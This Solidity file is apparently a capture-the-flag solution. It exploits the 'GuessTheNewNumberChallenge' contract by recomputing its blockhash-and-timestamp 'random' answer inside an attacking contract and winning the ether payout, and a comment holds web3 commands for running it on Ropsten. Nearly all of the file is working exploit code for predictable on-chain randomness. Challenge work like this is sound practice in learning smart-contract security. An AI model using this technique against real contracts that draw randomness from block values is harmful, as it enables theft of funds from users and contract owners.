pragma solidity 0.4.21;

/*
const oneEth = web3.utils.toWei('1', 'ether');
var cheatTheNewNumber = await CheatTheNewNumber.deployed();
var balance = await cheatTheNewNumber.balance();
web3.utils.fromWei(balance);
await cheatTheNewNumber.guess({from: accounts[0], value: oneEth});
await cheatTheNewNumber.isComplete();

// ropsten balance
web3.eth.getBalance('0xd20FF949eb2A487823828B9E14Ab39cF8C31eb11')


// development balance
web3.eth.getBalance('0x3C5a99d8f3b559618e56D993E73f10e4406699d5')
*/

contract CheatTheNewNumber {
    address otherContract;

    function CheatTheNewNumber() public {
        otherContract = 0xd20FF949eb2A487823828B9E14Ab39cF8C31eb11; // ropsten GuessTheNewNumberChallenge contract
        // otherContract = 0x1F18BFB172b372BFA525E4cA35644e71778e4069; // dev
    }

    function isComplete() public view returns (bool) {
        GuessTheNewNumberChallenge guessTheNewNumberChallenge = GuessTheNewNumberChallenge(otherContract);
        bool completed = guessTheNewNumberChallenge.isComplete();
        return completed;
    }

    function guess() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        GuessTheNewNumberChallenge guessTheNewNumberChallenge = GuessTheNewNumberChallenge(otherContract);
        guessTheNewNumberChallenge.guess.value(msg.value)(answer);
    }

    function balance() public view returns (uint256) {
        uint256 contractBalance = address(otherContract).balance;
        return contractBalance;
    }

    function() public payable { 
        //msg.sender.transfer(msg.value);
    }
}

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
